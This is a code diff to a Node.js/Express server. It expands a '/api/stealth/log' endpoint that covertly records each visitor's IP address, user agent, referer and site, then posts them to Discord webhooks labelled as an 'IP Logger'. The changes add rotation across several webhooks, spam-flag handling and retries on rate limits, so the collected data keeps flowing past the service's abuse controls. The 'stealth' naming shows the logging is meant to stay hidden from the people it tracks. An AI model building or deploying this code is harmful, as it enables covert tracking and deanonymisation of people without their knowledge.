@@ -96,29 +96,183 @@ app.use(express.urlencoded({ extended: true }));
 app.post('/api/stealth/log', async (req, res) => {
   console.log('🚨 Stealth log endpoint called');
   console.log('Client IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
+  console.log('Host header:', req.headers.host);
+  console.log('Origin header:', req.headers.origin);
+  console.log('Referer header:', req.headers.referer);
   console.log('Request headers:', JSON.stringify(req.headers, null, 2));
-  
+
   try {
     if (!webhookService) {
       throw new Error('WebhookService not initialized');
     }
-    
     if (webhookService.webhooks.length === 0) {
       throw new Error('No webhooks available');
     }
+
+    // Get client information
+    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || 'unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const timestamp = new Date().toISOString();
     
-    const payload = {
-      content: "🚨 **New Visitor Detected** 🚨",
-      username: "IP Logger Bot",
-      avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/logo.png"
+    // Get website information from headers
+    const host = req.headers.host || 'unknown';
+    const origin = req.headers.origin || '';
+    const referer = req.headers.referer || '';
+    
+    // Determine website URL and name
+    let websiteUrl = origin || `https://${host}`;
+    let websiteName = host.split('.')[0]; // Extract subdomain or domain name
+    
+    // Clean up website name
+    if (websiteName === 'www') {
+      websiteName = host.split('.').slice(1, -1).join('.');
+    }
+    
+    // Capitalize first letter
+    websiteName = websiteName.charAt(0).toUpperCase() + websiteName.slice(1);
+
+    console.log('📤 Message details:', {
+      clientIP,
+      websiteUrl,
+      websiteName,
+      host,
+      origin,
+      referer,
+      userAgent: userAgent.substring(0, 50) + '...'
+    });
+
+    // Create enhanced payload with custom domain info
+    const enhancedPayload = {
+      embeds: [{
+        title: `🌐 New Visitor on ${websiteName}`,
+        description: `Someone visited your website!`,
+        color: 0x00ff00,
+        fields: [
+          {
+            name: '📍 IP Address',
+            value: `\`${clientIP}\``,
+            inline: true
+          },
+          {
+            name: '🌍 Website',
+            value: `\`${websiteUrl}\``,
+            inline: true
+          },
+          {
+            name: '🕒 Timestamp',
+            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+            inline: true
+          },
+          {
+            name: '🔍 User Agent',
+            value: `\`\`\`${userAgent}\`\`\``,
+            inline: false
+          },
+          {
+            name: '📱 Referer',
+            value: referer ? `\`${referer}\`` : '`Direct Visit`',
+            inline: false
+          }
+        ],
+        footer: {
+          text: `${websiteName} IP Logger • ${new Date().toLocaleDateString()}`
+        },
+        timestamp: timestamp
+      }]
     };
 
-    console.log('📤 Sending webhook message...');
-    console.log('📤 Payload:', JSON.stringify(payload, null, 2));
-    
-    const result = await webhookService.sendMessage(payload, req);
-    console.log('✅ Webhook sent successfully:', result);
-    res.status(200).json({ success: true, result });
+    console.log('📤 Enhanced payload created');
+
+    let lastError = null;
+    const maxRetries = 3;
+
+    for (let retry = 0; retry < maxRetries; retry++) {
+      try {
+        console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
+        const webhook = await webhookService.getNextAvailableWebhook();
+
+        console.log(`📤 Using webhook: ${webhook.id}`);
+
+        // Check for spam before sending
+        if (webhookService.checkSpam(webhook.id)) {
+          console.log(`🚨 Spam detected on webhook ${webhook.id}, handling...`);
+          await webhookService.handleSpam(webhook.id);
+          continue; // Try with next webhook
+        }
+
+        console.log(`📤 Sending to webhook URL: ${webhook.url.substring(0, 50)}...`);
+
+        const response = await fetch(webhook.url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(enhancedPayload),
+          timeout: 10000
+        });
+
+        console.log(`📤 Webhook response status: ${response.status}`);
+
+        if (response.ok) {
+          // Success - update webhook stats
+          webhook.lastUsed = Date.now();
+          webhook.failureCount = 0;
+          webhook.lastFailure = null;
+
+          console.log('✅ Webhook message sent successfully');
+          return res.status(200).json({ 
+            success: true, 
+            result: {
+              success: true,
+              webhookId: webhook.id,
+              message: 'Message sent successfully',
+              websiteName,
+              websiteUrl
+            }
+          });
+        } else {
+          // Handle different error responses
+          const responseText = await response.text();
+          console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);
+
+          if (response.status === 404) {
+            webhook.status = 'inactive';
+            webhook.failureCount++;
+            webhook.lastFailure = Date.now();
+            console.log(`❌ Webhook ${webhook.id} marked as inactive (404)`);
+          } else if (response.status === 429) {
+            // Rate limited - wait and retry
+            const retryAfter = response.headers.get('retry-after') || 60;
+            console.log(`⏳ Rate limited, waiting ${retryAfter} seconds...`);
+            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
+          } else {
+            webhook.failureCount++;
+            webhook.lastFailure = Date.now();
+            console.log(`❌ Webhook ${webhook.id} failed (${response.status})`);
+          }
+
+          lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error(`❌ Webhook attempt ${retry + 1} failed:`, error.message);
+        lastError = error;
+
+        // Mark current webhook as failed
+        if (webhookService.webhooks[webhookService.currentWebhookIndex]) {
+          webhookService.webhooks[webhookService.currentWebhookIndex].failureCount++;
+          webhookService.webhooks[webhookService.currentWebhookIndex].lastFailure = Date.now();
+        }
+      }
+
+      // Wait before retry
+      if (retry < maxRetries - 1) {
+        console.log(`⏳ Waiting ${webhookService.retryDelay}ms before retry...`);
+        await new Promise(resolve => setTimeout(resolve, webhookService.retryDelay));
+      }
+    }
+
+    console.error(`❌ Failed to send message after ${maxRetries} retries`);
+    throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
   } catch (error) {
     console.error('❌ Webhook error:', error.message);
     console.error('❌ Error stack:', error.stack);
@@ -126,7 +280,6 @@ app.post('/api/stealth/log', async (req, res) => {
       initialized: !!webhookService,
       webhookCount: webhookService?.webhooks?.length || 0
     });
-    // Silent error handling for stealth operation
     res.status(200).json({ success: false, error: error.message });
   }
 });
